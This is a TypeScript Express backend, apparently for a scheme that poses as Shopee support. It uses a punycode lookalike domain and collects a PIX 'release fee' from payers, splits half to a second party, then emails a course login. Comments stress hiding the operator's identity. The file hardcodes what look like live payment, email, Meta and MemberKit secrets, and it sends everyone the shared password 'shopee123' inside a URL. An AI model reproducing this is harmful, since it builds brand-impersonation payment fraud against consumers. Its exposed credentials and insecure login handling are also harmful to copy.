import express from 'express';
import cors from 'cors';
import axios from 'axios';
import path from 'path';
import { Resend } from 'resend';
import crypto from 'crypto';

const app = express();
app.use(cors());
app.use(express.json());

// =====================================================
// 🔑 CONFIGURAÇÕES (IDENTIDADE NEUTRA)
// =====================================================
const BRAND_NAME = "Suporte Shopee"; // Sua identidade de marca agora é essa
const MK_SUBDOMAIN = "rodrigo-gato-ribeiro"; 
const MK_CLIENT_DOMAIN = "membros.xn--seubnushopp-5eb.com"; 
const MK_COURSE_ID = 275575; //
const MK_KEY = "G3gAuabnX5b3X9cs7oQ8aidn"; 

const PUBLIC_KEY = "rodrigo-igp_9mdb0v11ivwyoqtt"; 
const SECRET_KEY = "2z9x2whgofky0aneyx1pu0dkaj8y9j0m8981yitu81wdb75lrirj1u2b50xiqacf"; 

const resend = new Resend('re_3HT5Wehq_EDfH6jDM5f5JMznsQsAu9cez');
const META_PIXEL_ID = "847728461631550"; 
const META_ACCESS_TOKEN = "EAAGZAoNPRbbwBQlVq2XIPxcm6S3lE7EHASXNsyQoiULVOBES9uwoBt1ijXLIsS19daREz2xzuLnMl0C1yZAE3HYkKK19Fmykttzdhs5qZCZC0TkCviGXSrS9NuGvb99ZBDYZB8dkEzjlp6sZBrnG8x79dvvpV55mDhVXTocILMBbuxZCASrUZCIdUr18mYTZB0fgZDZD";

const bancoTransacoes = new Map();

// Função para mascarar logs (Protege seu nome e email no Render)
function maskLog(data: string): string {
    if (!data) return '';
    if (data.includes('@')) return data.split('@')[0].slice(0, 3) + '***@' + data.split('@')[1];
    return data.slice(0, 3) + '***';
}

function hashData(data: string): string {
    if (!data) return '';
    return crypto.createHash('sha256').update(data.toLowerCase().trim()).digest('hex');
}

app.use(express.static(path.join(__dirname, '..'))); 
app.get('/', (req, res) => { res.sendFile(path.join(__dirname, '..', 'index.html')); });

// -----------------------------------------------------
// ROTA PIX (Anonimizada nos Logs)
// -----------------------------------------------------
app.post('/pix', async (req, res) => {
    try {
        const { name, email, cpf, phone, valor } = req.body;
        const identifier = `ID${Date.now()}`;
        bancoTransacoes.set(identifier, { status: 'pending', emailCliente: email, nomeCliente: name });

        const payload = {
            identifier: identifier,
            amount: parseFloat(valor) || 27.90,
            client: { name, email, document: (cpf || "").replace(/\D/g, ''), phone: (phone || "").replace(/\D/g, '') },
            products: [{ id: "TAXA_01", name: "Taxa de Liberação", quantity: 1, price: parseFloat(valor) || 27.90 }],
            splits: [{ producerId: "cmg7bvpns00u691tsx9g6vlyp", amount: parseFloat(((parseFloat(valor) || 27.90) * 0.5).toFixed(2)) }],
            callbackUrl: "https://checkoutfinal.onrender.com/webhook"
        };

        const response = await axios.post('https://app.vizzionpay.com/api/v1/gateway/pix/receive', payload, {
            headers: { 'x-public-key': PUBLIC_KEY, 'x-secret-key': SECRET_KEY, 'Content-Type': 'application/json' }
        });

        console.log(`✅ PIX: Cliente ${maskLog(name)} gerou transação.`);
        return res.json({ success: true, payload: response.data.pix?.qrcode_base64 || response.data.pix?.qrcode, transactionId: identifier });
    } catch (error: any) { return res.status(401).json({ success: false }); }
});

// -----------------------------------------------------
// WEBHOOK (Proteção Total e Correção da Rota)
// -----------------------------------------------------
app.post('/webhook', async (req, res) => {
    const { event, transaction } = req.body;
    if (transaction?.status === 'COMPLETED' && event === 'TRANSACTION_PAID') {
        
        const idBusca = transaction.identifier || transaction.id;
        const memoria = bancoTransacoes.get(idBusca) || {};
        const nomeCliente = transaction.client?.name || memoria.nomeCliente || "Cliente Shopee";
        const emailCliente = transaction.client?.email || memoria.emailCliente;

        if (emailCliente) {
            // 🎯 MATRÍCULA (Flat Format para evitar erro de campo em branco)
            const mkPayload = {
                "full_name": nomeCliente,
                "email": emailCliente,
                "password": "shopee123",
                "password_confirmation": "shopee123",
                "course_id": MK_COURSE_ID
            };

            try {
                // Rota direta e headers protegidos
                await axios.post(`https://${MK_SUBDOMAIN}.memberkit.com.br/api/v1/enrollments`, mkPayload, {
                    headers: { "X-MemberKit-API-Key": MK_KEY, "Content-Type": "application/json", "Accept": "application/json" }
                });
                console.log(`✅ MK: Matrícula processada para ${maskLog(emailCliente)}`);
            } catch (err: any) {
                // Log mascarado: Não mostra o HTML da página nem seus dados
                console.log(`❌ MK FALHA: Código ${err.response?.status || 'desconhecido'}. Dados Pessoais Protegidos.`);
            }

            // META ADS (Anonimizado)
            axios.post(`https://graph.facebook.com/v18.0/${META_PIXEL_ID}/events`, {
                data: [{
                    event_name: "Purchase", event_time: Math.floor(Date.now() / 1000), action_source: "website",
                    user_data: { em: [hashData(emailCliente)], fn: [hashData(nomeCliente)] },
                    custom_data: { value: Number(transaction.amount), currency: "BRL" }
                }],
                access_token: META_ACCESS_TOKEN
            }).catch(() => {});

            // 📧 E-MAIL (Remetente Anonimizado)
            setTimeout(async () => {
                await resend.emails.send({
                    from: `${BRAND_NAME} <contato@xn--seubnushopp-5eb.com>`, // Nome da marca, não o seu
                    to: emailCliente,
                    subject: 'Seu acesso chegou! 🚀 Liberação Confirmada',
                    html: `
                        <div style="font-family: sans-serif; max-width: 600px; padding: 20px; border: 1px solid #eee; border-radius: 10px;">
                            <h2 style="color: #ee4d2d;">Olá! 🎉</h2>
                            <p style="font-size: 16px;">Sua liberação foi concluída com sucesso. Clique abaixo para entrar no seu painel:</p>
                            <div style="text-align: center; margin: 30px 0;">
                                <a href="https://${MK_CLIENT_DOMAIN}/users/sign_in?user[email]=${encodeURIComponent(emailCliente)}&user[password]=shopee123" 
                                   style="background: #ee4d2d; color: white; padding: 18px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; font-size: 18px; display: inline-block;">
                                    ACESSAR MEU PAINEL AGORA
                                </a>
                            </div>
                            <p style="font-size: 12px; color: #666;">Seu login: ${emailCliente}<br>Sua senha: shopee123</p>
                        </div>`
                });
            }, 2000);
        }
    }
    return res.status(200).send("OK");
});

app.listen(process.env.PORT || 3000, () => console.log("🚀 Sistema Blindado Online!"));
